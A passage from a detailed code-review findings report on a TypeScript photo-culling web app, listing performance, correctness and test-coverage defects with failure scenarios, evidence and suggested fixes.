**Fix witness (acceptance criterion).** A table-driven test over an extracted opsToLabel asserting one distinct label per pattern in -1|0|1|2|3 and that no Op['kind'] produces the 'Unknown' fallback. Must go red if the ternary is restored.

---

#### R1-31 — `src/main.ts:1971` (+2 more sites: src/catalog/smartCollections.ts:103, src/catalog/smartCollections.ts:107)

**The search filter reaches FileRecord's cameraModel and…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: quality · Direction: fails-closed
- Anchor: `(f as any).cameraModel?.toLowerCase().includes(query) ||`

**What's wrong.** src/catalog/types.ts:34-40 declares cameraModel and lensModel on FileRecord, and its comment reads 'Names match the readers that already existed in smartCollections.ts and main.ts's search filter -- both read cameraModel/lensModel'. The type therefore documents this exact branch as its consumer while the branch reaches the fields through `as any`, so a rename of cameraModel breaks search silently with tsc clean. The class has two more members outside the reported site: src/catalog/smartCollections.ts:103 and :107 carry the identical casts. Note filters.ts:47-49's comment ('Candela stores no IPTC yet') is now stale - types.ts:31 has iptc?: IptcFields - and neither search engine queries it.

**Failure scenario.** A maintainer renames cameraModel to cameraMake on FileRecord. tsc fails in filters.ts and types.ts, is fixed there, and the build goes green - while main.ts's search branch silently stops matching camera names forever, because the `as any` cast means the compiler never saw the reference. The same happens in smartCollections.ts's criteria evaluation.

**Witness.** not run - the deciding facts are the casts and the declaration, both quoted: src/main.ts:1971-1972 (`(f as any).cameraModel` / `(f as any).lensModel`), src/catalog/types.ts:34-40 (both fields declared, with the comment naming main.ts's search filter as a reader), src/catalog/smartCollections.ts:103 and :107 (the same casts).

**Suggested fix.** Drop the casts and read the declared fields directly - `f.cameraModel?.toLowerCase().includes(query)`. Better, delete the whole inline predicate and route through the tested engine as R1-17 prescribes, which removes the casts by construction. Fix the same two casts in smartCollections.ts and refresh the stale 'no IPTC yet' comment in filters.ts:47-49.

**Fix witness (acceptance criterion).** `npm run build` under the existing strict tsconfig is the pin - with the casts removed, a rename of cameraModel must produce a tsc error at this site. It currently does not.

**Fix constraint.** tsconfig.json sets noUnusedLocals and noUnusedParameters but the casts suppress rather than violate them, so removing the casts must not surface a previously-hidden unused-symbol error in the same expression.

---

#### R1-24 — `src/main.ts:1999`

**rebuildGrid's default folder branch runs two full…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: performance · Direction: fails-closed
- Anchor: `let visible = filesToShow.filter((f) => f.folderId === folder.id && matchesCullFilter(f));`

**What's wrong.** When folderFilter === null (the default 'All folders' view) the `continue` at 1998 never fires, so the loop runs over every folder doing two full filter passes each: one for `visible` at 1999 and one for `inFolder` at 2003. rebuildGrid is called by refreshCullDependents:2088-2089 on every cull write, and rateFile:2132-2135 / flagFile:2141-144 compose on it, plus 20+ other call sites (1838, 1883, 1895, 1906, 1915, 2155, 2706, 2752, 5122, 5338, 5748, 6086, 6101, 6296, 6343, 6373, 6408). The codebase states its own standard for exactly this: filters.test.ts:447-476 pins applyFilters to <= 2.6x on a doubling at 10k rows, and stacks.ts:79-80 says 'a per-file indexOf here would make the grid's hot render path quadratic on a 100k catalog'. rebuildGrid calls that pinned applyFilters at 1953 and then multiplies the result by folders.

**Failure scenario.** A 100k-photo catalog spread over ~1000 date folders - the scale filters.ts and stacks.ts both document as the product's target. The user culls with the 1-5 keys in All folders: each keypress does ~200M predicate evaluations, an interactive hang. At the 10k scale the test suite already pins, ~100 folders costs ~2M per keypress. The un-debounced search input at 6291 pays the same cost per keystroke whenever the box is cleared.

**Witness.** not run - no browser was permitted, so the hang threshold is unmeasured; that is why this is a Suggestion and not a Critical. Control flow quoted at main.ts:1976-2013; call frequency from refreshCullDependents:2088-2089, writeCullToFile:2121-2126, rateFile:2132-2135, flagFile:2141-2144, :5698 and 20+ rebuildGrid call sites. The project's own scale standard quoted from src/app/filters.test.ts:447-476 and src/app/stacks.ts:79-80.

**Suggested fix.** Group once before the loop, exactly as the (currently unreachable, R1-23) fast branch already does: build `const byFolder = new Map<number, FileRecord[]>()` in one O(N) pass, then per folder take `byFolder.get(folder.id) ?? []` for inFolder and filter that for visible. Debounce the search input while you are there.

**Fix witness (acceptance criterion).** A perf assertion in the style of filters.test.ts:447-476 - rebuildGrid over a synthetic 10k-file/200-folder catalog must not scale worse than ~2.6x when the file count doubles. Must go red if the per-folder filter passes are restored.

**Fix constraint.** The fix must preserve the live branch's tallyScope ordering - the unreachable fast branch at 2013-2040 uses a DIFFERENT tallyScope argument and stackVisibleFiles ordering (see R1-23), so copying it wholesale would change what the footer counts report.

---

#### R1-23 — `src/main.ts:2013`

**28 lines of rebuildGrid (2013-2040) are unreachable dead…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: quality · Direction: fails-closed
- Anchor: `// Apply cull filter to the filtered set`

**What's wrong.** Discovered while verifying R1-24. The previousImportFilter arm returns at 1992-1993 and the folder arm returns at 2010-2011, and those are the only two arms of the tail if/else - so everything from the 'Apply cull filter to the filtered set' comment at 2013 onward can never execute, including tallyScope(filesToShow) at 2014 and the O(N) `const filesByFolder = new Map<number, FileRecord[]>()` grouping at 2025. tsc --strict does not flag it: tsconfig.json sets strict, noUnusedLocals, noUnusedParameters and noFallthroughCasesInSwitch but NOT allowUnreachableCode:false, and TypeScript only errors on unreachable code when that is explicitly false. This is a correctness-of-intent defect, not only dead weight: the unreachable block's tallyScope argument and stackVisibleFiles ordering DIFFER from the live branch's, so the code that reads as the intended implementation is not the code that runs.

**Failure scenario.** A maintainer optimizing the grid's hot path reads rebuildGrid, finds the O(N) Map grouping at 2025, concludes the default view is already linear, and moves on - while the live path is the O(folders x files) loop at 1998-2003 (R1-24). Any future edit made inside 2013-2040 has no effect at all and will appear to work in review while changing nothing at runtime.

**Witness.** Control-flow read of src/main.ts:1976-2040: `} else if (previousImportFilter) { ... repaintGrid(); return; }` at 1992-1993, `} else { for (const folder of folders) { ... } repaintGrid(); return; }` at 2010-2011, then `// Apply cull filter to the filtered set` at 2013 with tallyScope at 2014 and the Map at 2025 - after both returns. tsconfig.json quoted: strict, noUnusedLocals, noUnusedParameters, noFallthroughCasesInSwitch present; allowUnreachableCode absent.

**Suggested fix.** Delete 2013-2040, or - better - restructure rebuildGrid so the O(N) Map grouping at 2025 IS the live path for the folderFilter === null case and the per-folder filter loop disappears (which also fixes R1-24). Add `"allowUnreachableCode": false` to tsconfig.json so this class cannot recur silently.

**Fix witness (acceptance criterion).** Enabling allowUnreachableCode:false in tsconfig.json must make `npm run build` fail at 2013 until the dead block is removed - that is the pin.

**Fix constraint.** The unreachable block's tallyScope(filesToShow) and stackVisibleFiles ordering differ from the live branch's, so deleting it is not behaviour-preserving by inspection alone - confirm which ordering is intended before removing it, or the fix silently chooses the wrong one.

---

#### R1-25 — `src/main.ts:2249`

**collectVisibleFiles' badge pass does a linear scan of the…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: performance · Direction: fails-closed
- Anchor: `const topId = s.fileIds.find((id) => files.some((f) => f.id === id));`

**What's wrong.** Two costs in one loop. The `files.some(...)` inside `find` is O(|s.fileIds| x |files|) per stack, summing to (total stack members) x |visible files|. Then stackCountFor(topId, stacks) (src/app/stacks.ts:112-118) walks ALL stacks doing includes per stack - but topId was produced by s.fileIds.find(...), so topId is in s.fileIds by construction, and stacks.ts:130-133 documents the invariant 'a photo lives in AT MOST ONE stack' (enforced on the write side by addToStack:134-158, and autoStackByCaptureTime:33-62 emits disjoint stacks by construction). So the first stack containing topId is s itself and the result is exactly s.fileIds.length - a value the loop already holds, making the call provably redundant rather than merely slow. collectVisibleFiles has exactly one call site (2051, inside repaintGrid, described at 2044-2046 as 'The single repaint tail ... Every path that changes what the grid should show ends here'), which terminates every rebuildGrid branch - so it runs on every cull write, filter chip and stack toggle.

**Failure scenario.** stacks.ts:4-6 documents the target workload: 'Bursts are why the Fuji users this product targets - they shoot 15-frame bursts as a habit'. A 10k-photo catalog is plausibly ~667 stacks x 15 members, so each rating keypress costs ~10k member probes each scanning up to 10k rows (~1e8 operations) plus ~667 x 10k for the redundant stackCountFor calls - visible jank on every star press, every chip toggle and every stack change.

**Witness.** not run - no browser; the redundancy is proved statically. Quotes: main.ts:2246-2252 (the loop), src/app/stacks.ts:112-118 (stackCountFor walks all stacks), src/app/stacks.ts:130-133 (the at-most-one-stack invariant, verbatim), addToStack:134-158 (enforces it on write), autoStackByCaptureTime:33-62 (disjoint by construction), main.ts:2051 (the single call site) and :2044-2046 (repaintGrid is the single repaint tail). Caveat the verifier could not close: a corrupt persisted stack row containing a duplicate id would make stackCountFor return an earlier stack's length - but that is already a data bug, and the comment at :2240-2242 assumes the invariant.

**Suggested fix.** Build a Set of visible ids once and drop the redundant call: `const visibleIds = new Set(files.map((f) => f.id)); for (const s of stacks) { if (s.fileIds.length < 2) continue; const topId = s.fileIds.find((id) => visibleIds.has(id)); if (topId !== undefined) stackBadges.set(topId, { stack: s, count: s.fileIds.length }); }` - semantically identical and O(V + total members).

**Fix witness (acceptance criterion).** An assertion (unit or QA) that stackBadges' count for every badge equals the owning stack's fileIds.length, plus a perf bound in the style of filters.test.ts:447-476. Must go red if the nested files.some scan is restored.

**Fix constraint.** The badge must keep riding the FIRST PRESENT member in s.fileIds order - the comment at src/main.ts:2240-2242 states that contract - so replacing the scan with a Set must not change which member is chosen.

---

#### R1-30 — `src/main.ts:4326` (+1 more sites: src/main.ts:4571)

**The 'z' zoom and '\' before/after handlers are…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `if (e.key.toLowerCase() === 'z' && !e.ctrlKey && !e.metaKey && !e.altKey) {`

**What's wrong.** Both handlers (4324 for 'z', 4571 for '\') are gated only on getState().module and call preventDefault() (4328, 4573), which cancels character insertion. Neither uses the isEditable guard that src/app/shortcuts.ts:53-58 defines and shortcuts.test.ts pins three times, and which main.ts re-derives inline at 5566 with a comment explaining why. Mitigation the verifier established, which is why this is a Suggestion and not a Critical: a sweep of index.html lines 2314-2650 (#module-develop) returns ZERO type=text, type=search, type=number, type=date, <textarea> or contenteditable elements - the develop module's only inputs are range sliders, one checkbox and one color picker - and src/app/modules.ts:29-33 sets current.root.hidden = true on switch, and a hidden subtree cannot hold focus. So there is no reachable everyday text target. The narrow path that does exist: open #smart-dialog (library-only trigger), focus #smart-save (a <button>, so not filtered), switchModule('develop') behind the still-open top-layer dialog, click back into #smart-name - now 'z' is swallowed and the loupe zoom toggles. Practical impact on develop's real fields: preventDefault suppresses <select> type-ahead for #profile and #crop-aspect on the two keys z and \, neither of which is an option initial.

**Failure scenario.** Via the dialog path above, typing 'Lazy sunset' into #smart-name while the develop module is active loses the 'z' (the field reads 'Lay sunset') and toggles the loupe 1x->2x->4x->fit behind the dialog, so dismissing it shows a zoomed image the user did not ask for. Separately, because the test is e.key.toLowerCase() === 'z' with no shiftKey check, Shift+Z fires the zoom - the one place in the file where an unmodified capital letter triggers a command.

**Witness.** grep -n "addEventListener('keydown'" src/main.ts -> 4324 (window, 'z', NO guard, preventDefault at 4328) and 4571 (window, '\\', NO guard, preventDefault at 4573). grep of index.html 2314-2650 for text-bearing inputs -> zero hits. grep -rn contenteditable src/ index.html -> no hits. grep -n 'createElement("input")' src/main.ts -> 4648 (type='file', hidden) and 5821 (type='checkbox'). src/app/shortcuts.ts:53-58 isEditable is module-private and NOT exported.

**Suggested fix.** Export isEditable from src/app/shortcuts.ts and early-return on it in both handlers (and in the fullscreen handler at 6580 - see R1-15), replacing the third inline copy at 5566. Add a shiftKey check to the 'z' test, or drop toLowerCase() and match both cases explicitly.

**Fix witness (acceptance criterion).** A shortcuts.test.ts-style case that focuses a text input, dispatches keydown 'z' and '\\', and asserts preventDefault was not called and no zoom/before-after state changed. Must go red if the guard is removed.

**Fix constraint.** The '\' handler at 4572 already checks !e.repeat and the 'z' handler does not - match the stricter sibling rather than the looser one, and preserve the window blur reset at src/main.ts:4580-4582 that clears a non-sticky before/after.

---

#### R1-28 — `src/main.ts:5449`

**A fully-failed delete-from-disk still flashes a green '✓ 0…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `flashSelectionInfo(`✓ ${report.deleted} file${report.deleted === 1 ? '' : 's'} moved to the system trash and removed from the catalog`);`

**What's wrong.** The report.failed.length branch shows the error banner at 5440-5445 and then execution continues unconditionally into setSelection([], null) and the success flash at 5448-5449. Two separate defects in one line: the flash fires when report.deleted is 0, and its two halves count different things - report.deleted counts handle removals while the 'removed from the catalog' half is actually deletedIds.length (5434-5437), which is scoped to files NOT in failedNames. So with two same-named rows where one failed, the sentence claims a catalog removal that was deliberately withheld. The underlying delete is correctly conservative - remove.ts:181-187 guards a missing remove() and reports it per file, the caller scopes the catalog step to what actually died, and remove.test.ts:121-127 pins the missing-API branch - so this is purely the reporting layer contradicting itself.

**Failure scenario.** Every selected file is on an ejected card. The red banner reads 'N files could not be deleted', and directly beside it a green flash reads '✓ 0 files moved to the system trash and removed from the catalog'. The selection is also cleared, so the user must rebuild it to retry - and the green tick is the last thing they read before deciding nothing went wrong.

**Witness.** not run - no browser; the deciding evidence is the straight-line control flow at src/main.ts:5431-5449 with no early return between the error banner and the success flash, plus remove.ts:181-187 (the missing-remove() guard, which fails closed), remove.ts:161-186 (deleteFilesFromDisk), and remove.test.ts:121-127 ('reports a missing remove() (browser without FSAA delete) as a failure, not a throw').

**Suggested fix.** Gate the flash on success and use one count for both halves: `if (report.deleted > 0) flashSelectionInfo(\`✓ ${deletedIds.length} file${deletedIds.length === 1 ? '' : 's'} moved to the system trash and removed from the catalog\`);`, and skip the setSelection clear when nothing was deleted so the user can retry.

**Fix witness (acceptance criterion).** A QA check that forces every delete to fail and asserts no green flash appears and the selection is preserved. Must go red if the unconditional flash is restored.

---

#### R1-26 — `src/main.ts:5686`

**The keyboard cull batch wraps the whole loop AND the…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `applyCullResult(record, await setCull(db, id, patch));`

**What's wrong.** The try opens at 5686, setCull is awaited per id inside it at 5691, applyCullResult mutates the in-memory record after that id's write resolves (src/catalog/culling.ts:40-45), refreshCullDependents() sits at 5698 still inside the try, and the catch at 5717 shows one 'Couldn't save the cull mark.' with no count and no ids. Self-healing depends on the module and fails where it matters: in Library the virtualizer's onChange (2568) repaints cells from the mutated records, so SCROLLING accidentally reveals the committed marks; in Survey, renderSurvey is called only from refreshCullDependents (2097), the selection subscriber (5098-5104, which early-returns because a cull write does not change the selection), the window resize handler (5106-5108) and the module's onShow (5194) - and Survey tiles are absolutely positioned with no virtualizer, so there is no scroll-driven repaint. The single-file sibling at 2118-2127 (rateFile) has the same shape but one id, so it has no partial-batch exposure.

**Failure scenario.** Select 40 photos in Survey view and press 5. The 12th setCull transaction aborts (IDB quota, a versionchange from the backup writer at 4001, a lost connection). The user sees 'Couldn't save the cull mark.' and a grid where NO photo shows 5 stars - yet 11 of them are 5-star on disk and will reappear as rated after the next reloadCatalog, and 29 are unrated. In Survey nothing repaints, so the tiles contradict the database for the rest of the session, and the filter chips and any 'rating >= 5' smart-collection count are wrong against both.

**Witness.** not run - reproducing needs an IndexedDB write failure injected mid-batch, and the app has no test seam for the dispatcher (it is an inline window listener inside init()), so the witness is the static trace: main.ts:5686-5719 with the try at 5686, the loop at 5688-5691, refreshCullDependents at 5698 inside the try, and the catch at 5717-5718; src/catalog/culling.ts:40-45 for the in-memory mutation; renderSurvey's four call sites (2097, 5098-5104, 5106-5108, 5194) and the selection subscriber's early return.

**Suggested fix.** Make the batch per-id failure-tolerant and the repaint unconditional: move refreshCullDependents() into a finally, wrap each id's setCull/applyCullResult in its own try incrementing a failedCount, and report `Couldn't save the cull mark on ${failedCount} of ${ids.length} photos.` when non-zero.

**Fix witness (acceptance criterion).** A test that injects a setCull rejection on the middle id of a three-id batch and asserts (1) the successful ids are reflected in the repainted UI and (2) the error message names the failed count. Must go red if the repaint moves back inside the try.

**Fix constraint.** The batched single repaint must stay batched - calling refreshCullDependents per id would rebuild the grid and re-render every smart collection N times per keystroke, and the ordering that captures beforeList/refBefore AFTER the writes but BEFORE the refresh is load-bearing for nextVisibleAfter's auto-advance.

---

#### R1-27 — `src/main.ts:6593`

**The four UI-painting steps at the tail of init() are bare,…**

- Severity: **Suggestion** · Confidence: high · Source: `[review]` · Category: correctness · Direction: fails-closed
- Anchor: `await renderCollections();`

**What's wrong.** The same function guards its two least important steps loudly - openCatalogDb at 1431-1438 (try/catch -> showError -> return) and listPresets at 6605-6610 with the comment 'a broken presets store shouldn't block the catalog' - and Pipeline.create at 1461-1466 (-> showGpuGate). The four steps that paint the UI between them (ensureQuickCollection, renderCatalog, renderCollections, renderSmartCollections at 6593-6604) are bare, and 6625 is a bare `init();`. A repo-wide sweep found no global error or rejection handler in src/, index.html, harness.ts or harness.html - only five <img> error listeners. The originally-claimed trigger is REFUTED: backup.ts:241-244 rejects any envelope whose version differs and routes it to showError via onError at 1459. A reachable trigger survives because BACKUP_FORMAT_VERSION has never been bumped (git log -S finds one commit, 999955d; the constant is 1) while row SHAPES are never validated - parseCatalogBackup checks only the envelope and per-store array-ness, decodeValue is a structural copy, restoreCatalogRows puts rows as-is, and listCollections casts straight to Collection[] with no shape check before renderCollections dereferences collection.fileIds.length at 2810. Two more: ensureQuickCollection performs IDB WRITES at boot (QuotaExceededError is real for a thumbnail-heavy catalog, and collections.ts:279 `for (const id of d.fileIds)` throws on a dupe-tray row without fileIds - a state its own comment at 283-285 names), and a versionchange-closed connection makes every db.transaction throw InvalidStateError. One claimed member does NOT belong: the last-file restore is safe, because openFile wraps its body in try/catch -> showError(openFileError(err)).

**Failure scenario.** A version-1 backup containing one collection row missing fileIds restores cleanly (only the envelope is validated). On the NEXT boot renderCollections throws a TypeError inside the bare await; renderSmartCollections, the last-file restore and renderPresets never run; the rejection disappears into the void of `init();` with no toast, no #error banner and no app console message. The sidebar was already cleared at 2790, so the user sees an empty grid and an empty sidebar - indistinguishable from a catalog with zero photos - and their edits are intact but unreachable.

**Witness.** grep -n 'unhandledrejection|window.onerror|init()' src/main.ts -> 1420 (async function init), 3078 (a comment), 6625 (the bare call). Repo-wide over src/ index.html harness.ts harness.html -> only five <img> error listeners (filmstrip.ts:135, main.ts:2475, 2717, 4779, 5081); no global handler exists. git log --oneline -S 'BACKUP_FORMAT_VERSION' -- src/catalog/backup.ts -> one commit (999955d), constant still 1 at backup.ts:59.

**Suggested fix.** Isolate each boot step so one failure degrades instead of truncating: wrap the four awaits in a loop of [name, fn] pairs with try/catch -> showError(`Couldn't load your ${name}.`, errorDetail(err)), and end the file with `init().catch((err) => showError("Candela didn't finish starting up.", errorDetail(err)));`. Validate restored row shapes in backup.ts rather than putting them verbatim.

**Fix witness (acceptance criterion).** A QA check that stubs renderCollections to throw and asserts the #error banner is visible and the remaining boot steps still ran. Must go red if the try/catch is removed.

**Fix constraint.** The fix must not swallow the openCatalogDb failure path at src/main.ts:1431-1438, which deliberately RETURNS after showError and disables #add-folder - a generic tail catch must not turn that early exit into a continued boot against a null db.

---

#### R1-29 — `src/catalog/remove.ts:52`

**Four places in the UI promise delete-from-disk is…**

- Severity: **Suggestion** · Confidence: low · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `'Each file is moved to the system trash (recoverable from the trash, not from Candela).'`

**What's wrong.** The promise is made at remove.ts:50-53 (the dialog body, written verbatim into #remove-dialog-body at main.ts:5396), remove.ts:7 ('the two must never be conflated'), main.ts:5406 (the switch tooltip), main.ts:5449 (the success flash), index.html:2764 and 2787 (the help dialog) - and remove.test.ts:46-50 asserts it: `expect(c.body.toLowerCase()).toContain('trash')`. So the recoverability claim is a TESTED CONTRACT. The implementation calls h.remove(), which the project's own DOM typings show is not in the standard lib: node_modules/typescript/lib/lib.dom.d.ts:14752-14766 declares FileSystemFileHandle with only createWritable() and getFile(). That is in-repo proof the API is non-standard/experimental, and it is why FileHandleLike declares remove? as optional. The missing-API case itself fails CLOSED and is tested (remove.ts:181-187, remove.test.ts:121-127), so the original 'the verb is silently dead' claim is rejected - the residual risk is narrower and is about the copy, not the code.

**Failure scenario.** If Chrome's remove() unlinks permanently rather than trashing, then a user who reads 'moved to the system trash (recoverable from the trash)' and confirms has just irrecoverably destroyed 300 rejected frames - and the test suite certifies the lie, because it asserts the word 'trash' appears rather than that the behaviour is recoverable. If remove() does trash, or is absent (the tested, failing-closed case), there is no defect beyond the wording being stronger than the code can guarantee.

**Witness.** not run - the deciding fact is Chrome's runtime behaviour for FileSystemFileHandle.remove() (existence, and trash-vs-unlink); no browser was launched and no artifact in this repo records it. What IS settled in-repo: grep -A12 'interface FileSystemFileHandle' node_modules/typescript/lib/lib.dom.d.ts -> createWritable and getFile only, no remove(); grep -rn trash across src/, index.html and docs -> remove.ts:7,44,52; main.ts:5388,5406,5449; index.html:2764,2787; asserted by remove.test.ts:46-50.

**Suggested fix.** Check typeof FileSystemFileHandle.prototype.remove === 'function' and its trash semantics in the target Chrome and record the result in a comment beside FileHandleLike. Until it is verified, soften the copy to what the code can guarantee - 'deleted from disk by the browser' - in all six places, and relax remove.test.ts:46-50 to assert the honest wording. If remove() unlinks, implement delete via FileSystemDirectoryHandle.removeEntry(name) on the parent handle (a shipped API) or change the copy to say 'permanently deleted'.

**Fix witness (acceptance criterion).** remove.test.ts:46-50 is the pin - it must be updated to assert whatever wording the verified platform behaviour supports, and must go red if the copy reverts to an unverified recoverability promise.

**Fix constraint.** The two-verb split is deliberate and documented at src/catalog/remove.ts:7 ('Delete From Disk (the file goes to the OS trash) - and the two must never be conflated'), and main.ts:5431-5439 orders disk FIRST, catalog second so 'a file that refuses to die (locked, ejected) must not lose its catalog row' - any fix must preserve that ordering and the distinction.

---

#### R1-34 — `src/main.ts:942` (+1 more sites: src/main.ts:988)

**The two letterbox inverse-mappings (eventToBufferPt,…**

- Severity: **Suggestion** · Confidence: low · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `const scale = Math.min(rect.width / cw, rect.height / ch);`

**What's wrong.** eventToBufferPt (crop-handle drags) and eventToMaskPt (dodge/burn painting) each recompute the contain scale and the centring offsets. src/app/navigator.ts already exports containBox - the same letterbox - and navigator.test.ts:25-45 pins it with three cases including 'portrait ... pillarboxes left and right', so the math is demonstrably unit-testable in this codebase; these two copies are reached by no test. The QA crop check (:887) asserts overlay PIXELS (getImageData alpha runs for the thirds lines and outline) and never dispatches a pointer event, so the draw side is covered and the inverse side is not. eventToMaskPt additionally duplicates eventToBufferPt verbatim for 14 lines and the two have already diverged - the buffer twin takes a margin parameter, the mask twin hard-codes 0 - which is how R1-21's third copy came to exist.

**Failure scenario.** A wrong sign on offX/offY, or Math.max substituted for Math.min in the scale, and every dodge/burn stroke lands at the wrong image point: the user paints a highlight on a face and the brightened region appears offset toward the letterbox edge. That wrong mask is then maskToOp'd into history (1086) and into the export, so the user's edit is corrupted with nothing failing. For crop, a flush frame becomes ungrabbable - precisely the regression the margin parameter at 942 was added to fix - and no test would catch it regressing.

**Witness.** not run - the coverage claim rests on navigator.test.ts:25-45 pinning containBox while no test reaches eventToBufferPt/eventToMaskPt, and on scripts/qa-loop.mjs:887 asserting pixels rather than dispatching pointer events. No probe was written; both functions are closures over module-level canvas state inside main.ts and cannot be imported.

**Suggested fix.** Pure-function extraction: both are functions of (rect, cw, ch, clientX, clientY) only. Export letterboxPoint(rect, cw, ch, clientX, clientY, margin) from src/app/navigator.ts next to the tested containBox, have both call sites use it, and add cases for pillarboxed portrait (offX > 0), letterboxed landscape (offY > 0), a point in the letterband returning null, and a point exactly margin outside returning non-null. This also removes the duplication that produced R1-21.

**Fix witness (acceptance criterion).** New navigator.test.ts cases on the extracted letterboxPoint covering all four letterbox orientations. Must go red if the scale reverts to a width-only ratio.

---

#### R1-33 — `src/main.ts:1103`

**The currentOpsFromSliders -> applyOpsToSliders round trip…**

- Severity: **Suggestion** · Confidence: low · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `function applyOpsToSliders(ops: Op[], cameraKey?: string): void {`

**What's wrong.** grep for applyOpsToSliders|currentOpsFromSliders across src/**/*.test.ts returns zero hits, and the QA harness has no undo/redo/history/preset check (grep for undo|redo|#history|apply-preset|#presets over scripts/qa-loop.mjs returns zero hits). The two checks that DO write ops ('edited filter' at :1662, 'sync' at :1733) assert only the IndexedDB row and never re-open the photo, and 'stability: 4 sequential opens' (:1059) opens UNEDITED files - so applyOpsToSliders is only reached end-to-end with an empty/As-Shot op set. The individual neutrality predicates it depends on are well tested (isNeutralTone/Presence/Vignette/Grain/Lightleak/Geometry/Crop, maskToOp/opToMask), but the emit list at 1036-1097 and the restore list at 1104-1226 are two separate hand-maintained enumerations with nothing asserting they agree. This is the gap R1-1 and R1-22 both fell out of.

**Failure scenario.** Add a 15th op kind (this file has gained dodgeBurn, frame and lightleak recently) and forget its restore line. The op is emitted, committed to IndexedDB, and silently dropped the instant the user presses Cmd+Z, clicks a history row, applies a preset, or re-opens the photo - while the DB row still contains it, so it reads as a render bug rather than data loss. Reset (4173) and the preset merge (4678) take the same path. 790 tests stay green.

**Witness.** not run - the coverage claim rests on greps over src/**/*.test.ts and scripts/qa-loop.mjs, both returning zero hits for the named symbols; no probe was written. The round trip itself was traced and found complete today (all 14 kinds emitted and restored, units matching), so this is a missing-pin finding, not a live defect.

**Suggested fix.** A QA-harness assertion is the cheapest pin, since a unit test cannot exist without extracting ~200 lines of DOM writes. In the existing 'edited filter' check, after committing exposure on E1, re-open E1 and assert document.querySelector('#exposure').value === '0.8'. Then generalise into one new check: move one control in EVERY module, commit, reload, re-open, and assert each control's DOM value came back - that single check makes the two lists agree by construction.

**Fix witness (acceptance criterion).** The new QA check is itself the witness: it must go red when any one op kind's restore line is deleted from applyOpsToSliders.

---

#### R1-36 — `src/main.ts:2387`

**The QA check named 'restore: banner appears after reload,…**

- Severity: **Suggestion** · Confidence: low · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `function retryFailedEditRenders(): void {`

**What's wrong.** scripts/qa-loop.mjs:509-543 is the only check that reaches retryFailedEditRenders. After clickEl(cdp, '#restore-banner-btn') it asserts exactly two things: waitFor(... '#restore-banner').hidden ...) and `if (!/grant/.test(reqLog)) throw`. It READS #footer-counts into a variable named footer but only interpolates it into the returned detail string - there is no throw on it - and it never re-probes the thumbnails, even though the probeThumbs expression it would need is already defined at the top of the file and used by the 'thumbs' check (:1040). So the check whose name promises 'click re-renders' does not verify a re-render.

**Failure scenario.** If the retry re-queues nothing - failedRenderIds already cleared, or drainEditRenders early-returning because editRenderBusy is still true from the drain that populated the failure set - the banner disappears, reqLog contains 'grant', the check PASSES, and the filmstrip and grid stay on camera B&W JPEGs for the rest of the session. That is exactly the silent degradation the failedEditRenders counter and the footer suffix at 2440-2447 were built to surface, shipping green.

**Witness.** not run - the claim rests on reading scripts/qa-loop.mjs:509-543 and confirming the absent throw, plus :1040 showing probeThumbs already available; no browser was launched and no probe was written.

**Suggested fix.** About three lines in the existing check: after the banner hides, waitFor the probeThumbs expression and assert probe.every(p => p.spread > 12) (the same statistic the 'thumbs' check uses), and assert #footer-counts no longer carries the failed-render suffix. No source change needed.

**Fix witness (acceptance criterion).** The strengthened assertion is the pin: it must go red if retryFailedEditRenders is made a no-op that only hides the banner.

---

#### R1-35 — `src/main.ts:4049`

**The batch-export loop has no coverage at all - the QA…**

- Severity: **Suggestion** · Confidence: low · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `await openFile(allFiles.find(f => f.id === currentFileId)!);`

**What's wrong.** scripts/qa-loop.mjs:947 ('export: toggle switches Edited render vs Camera JPEG bytes') exports a SINGLE file twice and asserts the -camera.jpg name plus a byte-size difference. #batch-export-row is gated on selectedIds.length > 1 (4041), so the harness never makes the button visible; the multi-select gesture it would need is already written in the sync check's ctrl+click loop (:1817). Nothing reaches the loop at 4075, its per-file catch at 4131, the batchExportCancelled break at 4076, or the restore at 4143. Separately, the restore's `allFiles.find(...)!` is unearned: the loop does `const record = allFiles.find(...); if (!record) continue;` two lines of its own, allFiles is reassigned wholesale on catalog reload (2746), and currentFileId is never re-validated against it. Per-file failures are also console.error-only (4132) with no list of which files failed, and the batch never calls ensureReadPermission before record.handle.getFile() - unlike openFile - so a revoked grant fails every remaining file with a NotAllowedError nobody sees.

**Failure scenario.** Coverage: three concrete defects (R1-9's wrong-pixels restore, the mask and grain omissions, R1-5's filename collision) all live in code no test or QA check executes, which is why all three shipped. Non-null assertion: during a long batch the catalog is reloaded (folder re-scan, missing-file purge) and the current record is no longer in allFiles, so openFile(undefined) throws on String(record.id) inside its first statement and the outer catch turns it into a misleading 'Batch export failed.' toast even though every file exported fine. Permission: the output-directory grant is revoked mid-run and the remaining 47 files each throw, each logs to the console, and the UI reads 'Completed 3/50 exports' for three seconds before the bar hides.

**Witness.** not run - the coverage claim rests on reading scripts/qa-loop.mjs:947 (single-file export), :1817 (the ctrl+click multi-select pattern that exists but is not used here) and main.ts:4041 (the >1 gate that keeps the button hidden); no probe was written and no browser was launched.

**Suggested fix.** QA-harness assertion: seed 3 generated JPEGs, ctrl+click all three using the sync check's existing pattern, hook showDirectoryPicker and the anchor click as the export check already does, click #batch-export-btn, and assert three DISTINCT written files plus the canvas returning to the pre-batch file and the selection count unchanged. Add one seeded file that throws on getFile() to pin the isolation branch and assert the summary reads 'Completed 2/3'. In the source, replace the `!` with the loop's own guard shape and call ensureReadPermission before the read.

**Fix witness (acceptance criterion).** The new multi-file QA check is the pin: it must go red on any of R1-5, R1-9 or the missing isolation, and must assert the failure count in the summary rather than only the success count.

---

#### R1-32 — `src/main.ts:5528`

**pasteSettingsFromClipboard writes clipboard JSON to…**

